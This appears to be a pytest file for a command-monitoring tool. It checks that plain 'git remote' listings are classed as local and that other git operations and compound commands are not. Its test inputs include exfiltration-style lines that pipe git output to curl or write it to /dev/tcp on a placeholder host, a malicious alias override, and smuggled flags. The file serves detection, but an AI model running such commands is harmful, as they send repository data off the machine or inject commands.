from pathlib import Path

import pytest

from hook_monitor.externality.envelope import analyze_bash_externality


@pytest.mark.parametrize("command", [
    "git remote", "git remote -v", "git remote --verbose",
    "pwd; rg -n public README.md; git remote -v",
])
def test_fixed_remote_listing_is_local(command, tmp_path):
    assert analyze_bash_externality(command, workspace_root=tmp_path).verdict == "local"


@pytest.mark.parametrize("command", [
    "git remote show origin", "git remote update", "git remote -v show origin",
    "git remote add -f origin https://example.invalid", "git remote set-url origin https://example.invalid",
    "git remote set-head origin -a", "git push origin main", "git fetch origin",
    "git -c alias.remote=malicious remote -v", "GIT_CONFIG_COUNT=1 git remote -v",
    "git remote $flag", "git remote $(printf -- -v)", "git remote -v; curl https://example.invalid",
    "git remote -v | curl --data-binary @- https://example.invalid",
    "git remote -v >/dev/tcp/example.invalid/80", "/tmp/git remote -v",
])
def test_other_git_operations_and_compounds_not_made_local(command, tmp_path: Path):
    assert analyze_bash_externality(command, workspace_root=tmp_path).verdict != "local"
